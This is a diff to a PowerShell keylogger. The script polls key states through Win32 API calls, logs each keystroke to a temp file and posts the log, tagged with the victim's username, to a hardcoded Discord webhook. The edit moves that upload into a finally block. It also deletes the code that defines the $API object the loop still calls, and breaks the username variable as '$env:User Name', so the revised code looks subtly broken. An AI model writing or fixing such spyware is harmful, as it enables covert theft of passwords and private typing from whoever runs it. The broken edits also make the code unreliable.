@@ -8,33 +8,12 @@ $webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40m
 $PID > "$env:temp/DdBPKCytRe"
 
 # keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
-
-  # webhook process
-  $logs = Get-Content "$logFile" | Out-String
-  $Body = @{
-    'username' = $env:UserName
-    'content' = $logs
+function KeyLogger($logFile="$env:temp/$env:User Name.log") {
+  
+  # generate log file if it doesn't exist
+  if (-not (Test-Path $logFile)) {
+      New-Item -Path $logFile -ItemType File -Force
   }
-  Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
-
-  # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
-
-  # API signatures
-  $APIsignatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-public static extern short GetAsyncKeyState(int virtualKeyCode);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
-
- # set up API
- $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
 
   # attempt to log keystrokes
   try {
@@ -42,7 +21,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       Start-Sleep -Milliseconds 40
 
       for ($ascii = 9; $ascii -le 254; $ascii++) {
-
         # use API to get key state
         $keystate = $API::GetAsyncKeyState($ascii)
 
@@ -61,16 +39,23 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           # translate virtual key
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+            [System.IO.File]::AppendAllText($logFile, $loggedchar.ToString(), [System.Text.Encoding]::Unicode)
           }
         }
       }
     }
   }
-
-  # send logs if code fails
+  catch {
+    # Log the error for debugging
+    Write-Host "Error: $_"
+  }
   finally {
     # send logs via webhook
+    $logs = Get-Content "$logFile" | Out-String
+    $Body = @{
+      'username' = $env:User Name
+      'content' = $logs
+    }
     Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
   }
 }
